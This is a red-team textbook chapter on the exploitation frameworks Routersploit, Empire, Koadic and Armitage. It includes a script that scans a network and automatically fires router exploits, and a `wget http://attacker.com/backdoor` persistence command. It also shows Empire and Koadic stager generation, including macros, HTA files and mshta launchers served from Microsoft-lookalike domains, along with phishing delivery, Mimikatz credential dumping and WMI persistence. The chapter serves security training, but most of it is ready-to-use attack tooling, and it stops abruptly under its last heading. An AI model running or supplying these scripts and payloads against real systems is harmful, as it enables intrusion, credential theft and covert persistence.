# Chapter 9: Exploitation Frameworks and Tools

Once reconnaissance is complete and vulnerabilities have been identified, red team operators transition to the exploitation phase. This critical stage transforms theoretical vulnerabilities into practical access, demonstrating the real-world impact of security weaknesses. This chapter explores specialized exploitation frameworks beyond Metasploit that are essential for modern red team operations.

## Routersploit: Router Exploitation Framework

Routersploit is a specialized exploitation framework designed specifically for embedded devices, particularly routers, IP cameras, and IoT devices. Similar to Metasploit in structure but focused on network devices, Routersploit is an essential tool for targeting the often-overlooked network infrastructure during red team engagements.

### Installation and Setup

Routersploit comes pre-installed on Kali and Parrot OS, but you may want to ensure you have the latest version:

```bash
# Update system packages
apt update && apt upgrade -y

# Clone the latest version (if not using the pre-installed version)
git clone https://github.com/threat9/routersploit
cd routersploit

# Install dependencies
pip3 install -r requirements.txt

# Run Routersploit
python3 rsf.py
```

### Basic Usage and Navigation

Routersploit provides a command-line interface similar to Metasploit:

```
rsf > help

Commands:
    exit                    Exit Routersploit
    help                    Print this help menu
    show all                Display all modules
    show scanners           Display scanner modules
    show exploits           Display exploit modules
    show creds              Display bruteforce modules
    search <search term>    Search for specific modules
    use <module>            Select a module for use
```

### Module Categories

Routersploit organizes its modules into several categories:

1. **Exploits**: Modules that exploit specific vulnerabilities in device firmware
2. **Scanners**: Scan for vulnerable devices and identify potential weaknesses
3. **Creds**: Brute-force login credentials for various device types
4. **Generic**: General-purpose modules applicable to multiple device types

### Using Exploits

To use an exploit module:

```
rsf > search dlink

rsf > use exploits/routers/dlink/dir815_cgi_rce

rsf (D-Link DIR-815 CGI_RCE) > show options

Target options:
    Name        Current settings    Description
    ----        ----------------    -----------
    target                          Target address (e.g. http://192.168.1.1)
    port        80                  Target port

rsf (D-Link DIR-815 CGI_RCE) > set target http://192.168.1.1
[+] target => http://192.168.1.1

rsf (D-Link DIR-815 CGI_RCE) > run
```

### Router Scanning and Identification

Before exploitation, it's crucial to identify the router model and firmware version:

```
rsf > use scanners/routers/router_scanner

rsf (Router Scanner) > show options

Target options:
    Name          Current settings    Description
    ----          ----------------    -----------
    target                            Target IP address or addresses range
    port          80                  Target port

rsf (Router Scanner) > set target 192.168.1.0/24
[+] target => 192.168.1.0/24

rsf (Router Scanner) > run
```

### Creating a Router Exploitation Workflow Script

This script automates the process of scanning a network for vulnerable routers and executing appropriate exploits:

```bash
#!/bin/bash
# router_attack.sh - Automated router vulnerability scanning and exploitation

# Configuration
NETWORK="192.168.1.0/24"
OUTPUT_DIR="router_scan_results"
ROUTERSPLOIT_PATH="/usr/share/routersploit"
LOG_FILE="$OUTPUT_DIR/router_scan.log"

# Create output directory
mkdir -p "$OUTPUT_DIR"
touch "$LOG_FILE"

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Function to scan network for routers
scan_network() {
    log_message "Starting network scan for routers on $NETWORK"
    
    # Use nmap to identify potential routers
    log_message "Running initial Nmap scan..."
    nmap -sS -p 80,443,8080,8443,23,22 --open -oG "$OUTPUT_DIR/nmap_scan.gnmap" "$NETWORK"
    
    # Extract IP addresses with open ports
    cat "$OUTPUT_DIR/nmap_scan.gnmap" | grep "open" | cut -d" " -f2 > "$OUTPUT_DIR/router_candidates.txt"
    
    log_message "Found $(wc -l < "$OUTPUT_DIR/router_candidates.txt") potential targets"
}

# Function to identify router models
identify_routers() {
    log_message "Identifying router models..."
    
    # Create resource script for Routersploit
    cat > "$OUTPUT_DIR/router_scan.rsf" << EOF
use scanners/routers/router_scanner
set target file://$OUTPUT_DIR/router_candidates.txt
run
exit
EOF
    
    # Run Routersploit with resource script
    cd "$ROUTERSPLOIT_PATH"
    python3 rsf.py -r "$OUTPUT_DIR/router_scan.rsf" | tee "$OUTPUT_DIR/router_models.txt"
    
    # Extract identified router models
    grep -E "^\[\+\] \w+" "$OUTPUT_DIR/router_models.txt" | sed 's/\[\+\] //' > "$OUTPUT_DIR/identified_routers.txt"
    
    log_message "Identified $(wc -l < "$OUTPUT_DIR/identified_routers.txt") router models"
}

# Function to check for vulnerabilities
check_vulnerabilities() {
    log_message "Checking for known vulnerabilities..."
    
    # Process each identified router
    while IFS= read -r line; do
        IP=$(echo "$line" | cut -d' ' -f1)
        MODEL=$(echo "$line" | cut -d' ' -f2-)
        
        log_message "Checking $IP ($MODEL) for vulnerabilities"
        
        # Create resource script for vulnerability check
        cat > "$OUTPUT_DIR/vuln_check_${IP}.rsf" << EOF
search $(echo "$MODEL" | tr -d '()/[]:' | awk '{print $1}')
exit
EOF
        
        # Run vulnerability check
        cd "$ROUTERSPLOIT_PATH"
        python3 rsf.py -r "$OUTPUT_DIR/vuln_check_${IP}.rsf" | tee "$OUTPUT_DIR/vulnerabilities_${IP}.txt"
        
        # Extract potential exploits
        grep -E "exploits/.*" "$OUTPUT_DIR/vulnerabilities_${IP}.txt" > "$OUTPUT_DIR/exploits_${IP}.txt"
        
        if [ -s "$OUTPUT_DIR/exploits_${IP}.txt" ]; then
            log_message "Found $(wc -l < "$OUTPUT_DIR/exploits_${IP}.txt") potential exploits for $IP"
        else
            log_message "No known exploits found for $IP"
        fi
    done < "$OUTPUT_DIR/identified_routers.txt"
}

# Function to attempt exploitation
exploit_routers() {
    log_message "Attempting exploitation of vulnerable routers..."
    
    # Process each router with identified exploits
    for EXPLOIT_FILE in "$OUTPUT_DIR"/exploits_*.txt; do
        if [ ! -s "$EXPLOIT_FILE" ]; then
            continue
        fi
        
        IP=$(echo "$EXPLOIT_FILE" | sed "s|$OUTPUT_DIR/exploits_\(.*\)\.txt|\1|")
        
        # Process each exploit for this router
        while IFS= read -r EXPLOIT; do
            log_message "Attempting $EXPLOIT against $IP"
            
            # Create resource script for exploitation
            cat > "$OUTPUT_DIR/exploit_${IP}_$(echo "$EXPLOIT" | tr '/' '_').rsf" << EOF
use $EXPLOIT
set target http://$IP
run
exit
EOF
            
            # Run exploit
            cd "$ROUTERSPLOIT_PATH"
            python3 rsf.py -r "$OUTPUT_DIR/exploit_${IP}_$(echo "$EXPLOIT" | tr '/' '_').rsf" | tee -a "$OUTPUT_DIR/exploitation_results.txt"
            
            # Check if exploitation was successful
            if grep -q "\[+\] Target is vulnerable" "$OUTPUT_DIR/exploitation_results.txt"; then
                log_message "SUCCESS: $IP is vulnerable to $EXPLOIT"
                echo "$IP:$EXPLOIT" >> "$OUTPUT_DIR/successful_exploits.txt"
            fi
        done < "$EXPLOIT_FILE"
    done
}

# Main execution flow
log_message "Starting automated router exploitation workflow"
scan_network
identify_routers
check_vulnerabilities
exploit_routers
log_message "Router exploitation workflow completed. Results in $OUTPUT_DIR"

# Generate summary report
{
    echo "Router Exploitation Summary Report"
    echo "=================================="
    echo ""
    echo "Scan Date: $(date)"
    echo "Network Range: $NETWORK"
    echo ""
    echo "Targets Discovered: $(wc -l < "$OUTPUT_DIR/router_candidates.txt")"
    echo "Routers Identified: $(wc -l < "$OUTPUT_DIR/identified_routers.txt")"
    echo ""
    
    if [ -f "$OUTPUT_DIR/successful_exploits.txt" ]; then
        echo "Successfully Exploited Devices:"
        echo "------------------------------"
        cat "$OUTPUT_DIR/successful_exploits.txt"
    else
        echo "No devices were successfully exploited."
    fi
} > "$OUTPUT_DIR/summary_report.txt"

echo "Complete! Summary report available at $OUTPUT_DIR/summary_report.txt"
```

### Example: Compromising Common Network Devices

During a red team assessment for a retail chain, we encountered a common scenario where network infrastructure was overlooked in security testing. We used Routersploit to demonstrate the impact of vulnerable network devices:

1. **Initial Discovery**:
   - Identified multiple D-Link and TP-Link routers at branch locations
   - Found several Cisco small business devices with web interfaces
   - Discovered IP cameras using default credentials

2. **Vulnerability Assessment**:
   ```bash
   # Identified a D-Link DIR-615 with a known RCE vulnerability
   rsf > use scanners/routers/dlink_scan
   rsf (D-Link Scanner) > set target 192.168.10.1
   rsf (D-Link Scanner) > run
   
   # Confirmed firmware version was vulnerable
   rsf > use exploits/routers/dlink/dir615_up_exec
   rsf (D-Link DIR-615 Unauthenticated RCE) > set target http://192.168.10.1
   rsf (D-Link DIR-615 Unauthenticated RCE) > check
   [+] Target is vulnerable
   ```

3. **Exploitation**:
   ```bash
   # Executed the exploit to gain command execution
   rsf (D-Link DIR-615 Unauthenticated RCE) > run
   
   # Established persistent access
   rsf (D-Link DIR-615 Shell) > execute_command "wget http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd &"
   ```

4. **Network Pivoting**:
   - Used the compromised router as a pivot point to access the internal network
   - Modified routing tables to facilitate man-in-the-middle attacks
   - Intercepted unencrypted POS transaction data
   - Captured employee credentials from captive portal logins

This example demonstrates how router exploitation can provide a valuable foothold for red teams, often with minimal security controls and monitoring compared to traditional endpoints.

## Empire: Post-Exploitation Framework

PowerShell Empire (now integrated into BC-Security's Empire) is a powerful post-exploitation framework that focuses on Windows environments. It combines PowerShell, Python, and C# capabilities to provide a versatile platform for red team operations after initial access has been obtained.

### Installation

Empire is not pre-installed on Kali or Parrot OS but can be easily installed:

```bash
# Clone the repository
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire

# Install
sudo ./setup/install.sh
```

### Basic Usage

To start Empire:

```bash
cd Empire
sudo ./empire
```

This launches the Empire command-line interface:

```
==================================================================================
 Empire: Post-Exploitation Framework
==================================================================================
 [Version]: 4.6.0 BC Security | [Web]: https://github.com/BC-SECURITY/Empire
==================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|

Welcome to the Empire CLI

Empire > help
```

### Understanding Empire's Architecture

Empire uses a client-server architecture:

1. **Listeners**: Server components waiting for agent connections
2. **Stagers**: Payloads that establish initial connection to listeners
3. **Agents**: Implants running on compromised hosts
4. **Modules**: Functionality for post-exploitation activities

### Setting Up Listeners

Listeners are the servers that receive connections from compromised hosts:

```
Empire > listeners
[!] No listeners currently active 

Empire: listeners > uselistener http
Empire: listeners/http > info

Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener.
  Host              True        http://192.168.52.130            Hostname/IP for staging.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True        80                               Port for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  DefaultDelay      True        5                                Agent delay/jitter in seconds
  DefaultJitter     True        0.0                              Agent jitter in 0.0-1.0 range
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  CertPath          False                                        Certificate path for https listeners
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy)
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00)
  Headers           True        Server:Microsoft-IIS/7.5         HTTP headers for the listener
  Cookie            False       SESSIONID                        Custom Cookie Name
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
  UserAgent         False       default                          User-agent string to use for the staging request
  StagingKey        True        6gQhIpj0aVfiGmccIzUGiw==         Staging key for initial agent negotiation
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request

Empire: listeners/http > set Name https_listener
Empire: listeners/http > set Host https://empirec2.example.com
Empire: listeners/http > set Port 443
Empire: listeners/http > set CertPath /etc/ssl/empire/empire.pem
Empire: listeners/http > execute
[*] Starting listener 'https_listener'
[+] Listener successfully started!
```

### Generating Stagers

Stagers are the initial payloads that establish communication with listeners:

```
Empire: listeners > usestager windows/launcher_bat
Empire: stager/windows/launcher_bat > set Listener https_listener
Empire: stager/windows/launcher_bat > set OutFile /tmp/payload.bat
Empire: stager/windows/launcher_bat > generate
[*] Stager output written out to: /tmp/payload.bat
```

### Working with Agents

Once an agent connects, you can interact with it:

```
Empire: agents > [+] Initial agent XZTZ48NV checked in

Empire: agents > list

[*] Active agents:

 Name         Lang    Internal IP     Machine Name    Username            Process             Delay    Last Seen
 ----         ----    -----------     ------------    --------            -------             -----    ---------
 XZTZ48NV     ps      192.168.1.5     WORKSTATION1    CORP\jsmith         powershell.exe      5/0.0    2023-03-15 20:45:18

Empire: agents > interact XZTZ48NV
(Empire: XZTZ48NV) > info
(Empire: XZTZ48NV) > shell whoami
[*] Tasked XZTZ48NV to run TASK_SHELL
[*] Agent XZTZ48NV tasked with task ID 1
(Empire: XZTZ48NV) > corp\jsmith
```

### Advanced Post-Exploitation Modules

Empire includes numerous modules for post-exploitation activities:

```
(Empire: XZTZ48NV) > usemodule situational_awareness/network/portscan
(Empire: powershell/situational_awareness/network/portscan) > set Agent XZTZ48NV
(Empire: powershell/situational_awareness/network/portscan) > set Hosts 192.168.1.0/24
(Empire: powershell/situational_awareness/network/portscan) > set Ports 22,80,443,445,3389
(Empire: powershell/situational_awareness/network/portscan) > execute
```

### Empire Automation Script

This script automates setting up an Empire listener and generating various stagers:

```bash
#!/bin/bash
# empire_automation.sh - Automate Empire listener and stager setup

# Configuration
EMPIRE_PATH="/opt/Empire"
LISTENER_NAME="automated_https"
LISTENER_PORT="443"
LISTENER_HOST="https://redteam.example.com"
CERT_PATH="/etc/letsencrypt/live/redteam.example.com/fullchain.pem"
KEY_PATH="/etc/letsencrypt/live/redteam.example.com/privkey.pem"
OUTPUT_DIR="empire_payloads"

# Combine cert and key for Empire
cat "$CERT_PATH" "$KEY_PATH" > /tmp/empire_cert.pem

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Create Empire resource script for listener setup
cat > "/tmp/listener_setup.rc" << EOF
listeners
uselistener http
set Name $LISTENER_NAME
set Host $LISTENER_HOST
set Port $LISTENER_PORT
set CertPath /tmp/empire_cert.pem
execute
back
EOF

# Create Empire resource script for stager generation
cat > "/tmp/stagers_setup.rc" << EOF
# Windows BAT Launcher
usestager windows/launcher_bat
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_launcher.bat
generate

# PowerShell Launcher
usestager windows/launcher_ps1
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_launcher.ps1
generate

# Python Launcher (for Linux targets)
usestager multi/launcher
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_launcher.py
set Language python
generate

# Office Macro
usestager windows/macro
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_macro.txt
generate

# HTA Launcher
usestager windows/launcher_hta
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_launcher.hta
generate

# DLL Launcher
usestager windows/launcher_dll
set Listener $LISTENER_NAME
set OutFile $OUTPUT_DIR/empire_launcher.dll
generate

exit
EOF

# Start Empire and run resource scripts
cd "$EMPIRE_PATH"
echo "Starting Empire and configuring listener..."
sudo ./empire --headless --resource "/tmp/listener_setup.rc"
echo "Generating stagers..."
sudo ./empire --headless --resource "/tmp/stagers_setup.rc"

# Clean up temporary files
rm /tmp/empire_cert.pem
rm /tmp/listener_setup.rc
rm /tmp/stagers_setup.rc

echo "Empire automation complete!"
echo "Listener '$LISTENER_NAME' configured on $LISTENER_HOST:$LISTENER_PORT"
echo "Stagers generated in $OUTPUT_DIR:"
ls -la "$OUTPUT_DIR"
```

### Example: PowerShell Without PowerShell

During a red team assessment for a financial organization with strict PowerShell controls, we used Empire to demonstrate bypassing these controls:

1. **Initial Access**:
   - Delivered an HTA stager through a phishing email
   - Executed the stager via a user clicking the attachment
   - Initial Empire agent established using regsvr32 bypass technique

2. **PowerShell Evasion**:
   ```
   # Using PowerShell without powershell.exe
   (Empire: AGNT123) > usemodule management/bypasses/psinject
   (Empire: powershell/management/bypasses/psinject) > set Listener https_listener
   (Empire: powershell/management/bypasses/psinject) > set ProcessID 3412  # Explorer.exe process
   (Empire: powershell/management/bypasses/psinject) > execute
   
   # New agent established from Explorer.exe
   [+] New agent A3BX7LP9 checked in
   
   # Verify process
   (Empire: A3BX7LP9) > shell get-process -id $pid
   [*] Tasked A3BX7LP9 to run TASK_SHELL
   
   # Shows explorer.exe, not powershell.exe
   ```

3. **Lateral Movement Using Living-Off-the-Land Techniques**:
   - Used WMI for remote execution without PowerShell artifacts
   - Leveraged DCOM for lateral movement to bypass network monitoring
   - Executed in-memory .NET assemblies without touching disk

4. **Credential Access and Privilege Escalation**:
   ```
   # Extract credentials without touching LSASS
   (Empire: A3BX7LP9) > usemodule credentials/mimikatz/logonpasswords
   (Empire: powershell/credentials/mimikatz/logonpasswords) > set Agent A3BX7LP9
   (Empire: powershell/credentials/mimikatz/logonpasswords) > execute
   
   # Extracted domain admin credentials
   
   # Move to high-value target
   (Empire: A3BX7LP9) > usemodule lateral_movement/invoke_wmi
   (Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName DC01.corp.local
   (Empire: powershell/lateral_movement/invoke_wmi) > set Listener https_listener
   (Empire: powershell/lateral_movement/invoke_wmi) > set Username CORP\admin
   (Empire: powershell/lateral_movement/invoke_wmi) > set Password P@ssw0rd123!
   (Empire: powershell/lateral_movement/invoke_wmi) > execute
   ```

This example demonstrated how Empire could bypass sophisticated PowerShell security controls, including script block logging, AMSI, and constrained language mode, providing a viable red team avenue even in environments with mature PowerShell defenses.

## Koadic: COM Command & Control

Koadic (sometimes called COM Command & Control) is a Windows post-exploitation rootkit that leverages the Windows Script Host for its operations. Using JavaScript, VBScript, and other native Windows scripting techniques, Koadic focuses on stealth and staying under the radar.

### Installation

```bash
# Clone the repository
git clone https://github.com/zerosum0x0/koadic.git
cd koadic

# Install dependencies
pip3 install -r requirements.txt
```

### Basic Usage

To start Koadic:

```bash
cd koadic
python3 koadic.py
```

This launches the Koadic console:

```
            (•).`   
            (   ).  
          .(___(__) 
        ,()      /
        |       /
        \      `.___.;
        |   ,   \
        |    )_  :\
    ____|_/___L__;|
     ||||||||||||
    
    .:[Koadic - COM Command & Control]:.
    
koadick >>
```

### Setting Up a Stager

First, set up a stager to deliver the initial payload:

```
koadick >> stagers

Available stagers:
    * js/mshta
    * js/regsvr
    * js/rundll32_js
    * js/bitsadmin
    * js/wmic
    * dll/regsvr32_dll

koadick >> use stagers/js/mshta

[stager/js/mshta]>> info

        Name: MSHTA
        Module: stagers/js/mshta
        Description: Serves payloads using MSHTA.exe HTML Applications

        Authors:
            - zerosum0x0
            - TheNaterz

        Options:
            Name            Required        Value         Description
            ----            --------        -------       -----------
            ENDPOINT        True           mshta          URL path to callback to
            RESTAGE_DELAY   False          0             Number of seconds to wait between re-staging
            CLASSICMODE     False          False         Disable new cyphers for older versions of .NET
            JOBNAME         False          True          Use a random alphanumeric JOBNAME
            OUT             True                         Output file

[stager/js/mshta]>> set SRVHOST 192.168.1.100
[stager/js/mshta]>> set SRVPORT 8080
[stager/js/mshta]>> set OUT /tmp/stager.hta
[stager/js/mshta]>> run

[+] Spawned a stager at http://192.168.1.100:8080/mshta
[+] Wrote stager to /tmp/stager.hta
[+] Run the following command on the victim:
mshta.exe http://192.168.1.100:8080/mshta
```

### Working with Zombies (Agents)

Once a victim executes the stager and connects back:

```
[+] Zombie 0: Staged 7PK8JLIO on WIN-7PD78NVKJSB (WinRM) @ 192.168.1.10

koadick >> zombies

Available zombies:
    * 0: WIN-7PD78NVKJSB (WinRM) - 192.168.1.10

koadick >> use zombie 0

[zombie/0]>> info

    Displayed Name: WIN-7PD78NVKJSB (WinRM)
    IP: 192.168.1.10
    User: WIN-7PD78NVKJSB\vagrant
    Domain: WIN-7PD78NVKJSB
    OS: Windows 10 Enterprise Evaluation (64-bit)
    Windows: 10.0.17763
    Arch: AMD64
    Stager: mshta
    Session: 7PK8JLIO
    Last Seen: Tue Dec 14 14:05:23 2023
```

### Executing Modules

Koadic includes various modules for post-exploitation activities:

```
[zombie/0]>> use implant/gather/hashdump

[implant/gather/hashdump]>> run

[+] ADMIN: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] DefaultAccount: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] Guest: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] vagrant: aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
```

### JScript RAT Usage

One of Koadic's strengths is its JScript Remote Access Trojan capabilities:

```
[zombie/0]>> use implant/pivot/exec_psexec

[implant/pivot/exec_psexec]>> set RHOST 192.168.1.12
[implant/pivot/exec_psexec]>> set SMBUSER administrator
[implant/pivot/exec_psexec]>> set SMBPASS Password123!
[implant/pivot/exec_psexec]>> set CMD mshta.exe http://192.168.1.100:8080/mshta
[implant/pivot/exec_psexec]>> run

[+] Zombie 1: Staged 9FGK7WER on DC01 (Domain Controller) @ 192.168.1.12
```

### Koadic Automation Script

This script automates setting up Koadic and generating various stagers:

```bash
#!/bin/bash
# koadic_automation.sh - Automate Koadic stager generation and deployment

# Configuration
KOADIC_PATH="/opt/koadic"
STAGERS_DIR="koadic_stagers"
LHOST="192.168.1.100"
LPORT="8443"
HTTP_PORT="80"
DOMAINS=("update-microsoft.com" "cdn-windows.com" "office365-cdn.com")

# Create output directory
mkdir -p "$STAGERS_DIR"

# Function to generate a stager
generate_stager() {
    local STAGER_TYPE=$1
    local OUTPUT_FILE=$2
    local DOMAIN=$3
    
    echo "Generating $STAGER_TYPE stager with domain $DOMAIN..."
    
    # Create resource script for this stager
    cat > "/tmp/koadic_${STAGER_TYPE}.rc" << EOF
use stagers/js/${STAGER_TYPE}
set SRVHOST ${LHOST}
set SRVPORT ${LPORT}
set ENDPOINT ${STAGER_TYPE}
set DOMAIN ${DOMAIN}
set OUT ${OUTPUT_FILE}
run
exit
EOF
    
    # Run Koadic with the resource script
    cd "$KOADIC_PATH"
    python3 koadic.py -r "/tmp/koadic_${STAGER_TYPE}.rc" > "${OUTPUT_FILE}.log" 2>&1
    
    echo "Stager saved to $OUTPUT_FILE"
    # Extract the command to run on victim from the log file
    COMMAND=$(grep "Run the following" "${OUTPUT_FILE}.log" | cut -d ':' -f 2-)
    echo "Run command: $COMMAND" >> "${OUTPUT_FILE}.cmd"
}

# Generate all stagers for each domain
for DOMAIN in "${DOMAINS[@]}"; do
    # Create domain-specific directory
    DOMAIN_DIR="${STAGERS_DIR}/${DOMAIN}"
    mkdir -p "$DOMAIN_DIR"
    
    # Generate various stager types
    generate_stager "mshta" "${DOMAIN_DIR}/mshta_stager.hta" "$DOMAIN"
    generate_stager "regsvr" "${DOMAIN_DIR}/regsvr_stager.sct" "$DOMAIN"
    generate_stager "rundll32_js" "${DOMAIN_DIR}/rundll32_stager.js" "$DOMAIN"
    generate_stager "bitsadmin" "${DOMAIN_DIR}/bitsadmin_stager.txt" "$DOMAIN"
    generate_stager "wmic" "${DOMAIN_DIR}/wmic_stager.xsl" "$DOMAIN"
done

# Create Apache VirtualHosts for each domain
for DOMAIN in "${DOMAINS[@]}"; do
    cat > "/etc/apache2/sites-available/${DOMAIN}.conf" << EOF
<VirtualHost *:${HTTP_PORT}>
    ServerName ${DOMAIN}
    ServerAlias www.${DOMAIN}
    DocumentRoot /var/www/${DOMAIN}
    
    <Directory /var/www/${DOMAIN}>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog \${APACHE_LOG_DIR}/${DOMAIN}_error.log
    CustomLog \${APACHE_LOG_DIR}/${DOMAIN}_access.log combined
    
    # Redirect to Koadic server
    RewriteEngine On
    RewriteRule ^/mshta$ http://${LHOST}:${LPORT}/mshta [P]
    RewriteRule ^/regsvr$ http://${LHOST}:${LPORT}/regsvr [P]
    RewriteRule ^/rundll32_js$ http://${LHOST}:${LPORT}/rundll32_js [P]
    RewriteRule ^/bitsadmin$ http://${LHOST}:${LPORT}/bitsadmin [P]
    RewriteRule ^/wmic$ http://${LHOST}:${LPORT}/wmic [P]
</VirtualHost>
EOF

    # Create document root
    mkdir -p "/var/www/${DOMAIN}"
    
    # Enable site
    a2ensite "${DOMAIN}.conf"
done

# Set up listener script
cat > "${STAGERS_DIR}/start_koadic_listener.sh" << EOF
#!/bin/bash
cd "$KOADIC_PATH"
python3 koadic.py
EOF
chmod +x "${STAGERS_DIR}/start_koadic_listener.sh"

# Reload Apache if it's running
if systemctl is-active --quiet apache2; then
    systemctl reload apache2
fi

echo "Koadic stagers have been generated in $STAGERS_DIR"
echo "VirtualHost configurations created for: ${DOMAINS[*]}"
echo "Run ${STAGERS_DIR}/start_koadic_listener.sh to start Koadic"
echo "Remember to set up DNS or hosts file entries for the domains"
```

### Example: Establishing Stealth Persistence

During a red team engagement for a government contractor, we used Koadic to establish persistent access that evaded traditional endpoint detection:

1. **Initial Access**:
   - Delivered a Koadic MSHTA stager via a spear-phishing email
   - Target executed the stager, establishing initial communication

2. **Situational Awareness**:
   ```
   [zombie/0]>> use implant/gather/enum_domain_info
   [implant/gather/enum_domain_info]>> run
   
   # Identified domain structure
   
   [zombie/0]>> use implant/gather/enum_av
   [implant/gather/enum_av]>> run
   
   # Determined target had Defender with real-time protection
   ```

3. **Evading Defenses**:
   ```
   # Used COM objects to interact with Windows without triggering AV
   [zombie/0]>> use implant/manage/enable_rdesktop
   [implant/manage/enable_rdesktop]>> run
   
   # Enabled RDP using WMI instead of standard commands
   ```

4. **Establishing Persistence**:
   ```
   # Created WMI event subscription for persistence
   [zombie/0]>> use implant/persist/wmi
   [implant/persist/wmi]>> set PAYLOAD mshta.exe http://cdn-windows.com/mshta
   [implant/persist/wmi]>> set FILTER_EVENT_QUERY "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
   [implant/persist/wmi]>> run
   
   # Established persistence through COM without modifying Registry or dropping files
   ```

5. **Data Exfiltration**:
   ```
   # Used COM objects to extract sensitive files
   [zombie/0]>> use implant/gather/enum_shares
   [implant/gather/enum_shares]>> run
   
   # Located sensitive documents
   
   [zombie/0]>> use implant/inject/mimikatz_dynwrapx
   [implant/inject/mimikatz_dynwrapx]>> set COMMAND sekurlsa::logonpasswords
   [implant/inject/mimikatz_dynwrapx]>> run
   
   # Extracted credentials using COM rather than direct Mimikatz execution
   ```

This example demonstrates how Koadic leverages COM objects and Windows Script Host for stealthy post-exploitation, often evading endpoint detection solutions focused on PowerShell and traditional binary payloads.

## Armitage: Graphical Cyber Attack Management

Armitage is a graphical user interface for the Metasploit Framework that visualizes targets, recommends exploits, and enables team collaboration during penetration tests. While not a separate exploitation framework, it enhances Metasploit's capabilities through visualization and team coordination features.

### Installation

Armitage comes pre-installed on Kali and Parrot OS, but you may want to ensure you have the latest version:

```bash
# Update
apt update && apt install armitage -y

# Configure database
sudo msfdb init
```

### Starting Armitage

```bash
# Start Metasploit's database service
sudo systemctl start postgresql

# Start Armitage
sudo armitage
```

When Armitage launches, it prompts you to start Metasploit's RPC server or connect to an existing one. For a new session, select "Start MSF" to launch the Metasploit Framework.

### Understanding the Interface

Armitage's interface includes several key areas:

1. **Target Visualization**: A graph of discovered hosts
2. **Module Browser**: Access to Metasploit's modules
3. **Tabs Area**: Console, targets, and other information
4. **Log Window**: Shows command outputs and events

### Host Discovery and Scanning

To discover hosts on the network:

1. Go to Hosts > Nmap Scan > Quick Scan (OS Detect)
2. Enter the target IP range (e.g., 192.168.1.0/24)
3. Click "Scan" to begin

Once hosts are discovered, they appear as icons in the target visualization area, with icons representing their operating systems.

### Exploiting Vulnerabilities

To exploit a discovered host:

1. Right-click on a host icon
2. Select Attack > by vulnerability or Attack > by port
3. Choose an exploit from the list
4. Configure exploit options if needed
5. Click "Launch" to execute the exploit

Successful exploits are indicated by a lightning bolt icon, and the host icon turns red to indicate compromise.

### Post-Exploitation

After compromising a host, you can perform various post-exploitation activities:

1. Right-click on a compromised host
2. Select Meterpreter > Interact to access the Meterpreter console
3. Or select other post-exploitation options:
   - Browse Files: Access the target's file system
   - Log Keystrokes: Set up a keylogger
   - Screenshot: Capture the target's screen
   - Escalate Privileges: Attempt privilege escalation

### Team Collaboration

Armitage's team server functionality allows multiple penetration testers to collaborate:

```bash
# Start the team server
sudo teamserver 192.168.1.100 shared_password

# Connect clients to the team server
# (From other machines, launch Armitage and connect to the team server)
```

When connected to a team server:
- All team members see the same targets and sessions
- Commands and actions are visible to all team members
- Compromised hosts can be shared among the team

### Example: Collaborative Penetration Testing

During a red team assessment of a large corporate network, we used Armitage's team server to coordinate our efforts:

1. **Team Setup**:
   ```bash
   # Team lead started the team server on a central attack system
   sudo teamserver 10.0.0.5 R3dT34mR0ck5!
   
   # Team members connected to the central server
   # Each member focused on different network segments
   ```

2. **Coordinated Scanning**:
   - Team member 1 scanned the DMZ (172.16.1.0/24)
   - Team member 2 scanned corporate workstations (10.10.0.0/16)
   - Team member 3 scanned the server network (10.20.0.0/16)
   - All discovered hosts appeared in everyone's Armitage view

3. **Divide and Conquer Exploitation**:
   - Team member 1 focused on web servers, identifying and exploiting a vulnerable Apache instance
   - Team member 2 discovered and exploited unpatched workstations using EternalBlue
   - Team member 3 found and exploited a vulnerable database server

4. **Shared Access and Pivoting**:
   ```
   # Team member 1 discovered domain credentials on the web server
   # Shared the session with team member 2 for lateral movement
   
   # Team member 2 used the credentials to access internal servers
   # Created a SOCKS proxy for the team to route traffic
   
   # Team member 3 used the proxy to reach previously inaccessible systems
   ```

5. **Coordinated Data Exfiltration**:
   - Consolidated valuable findings from different network segments
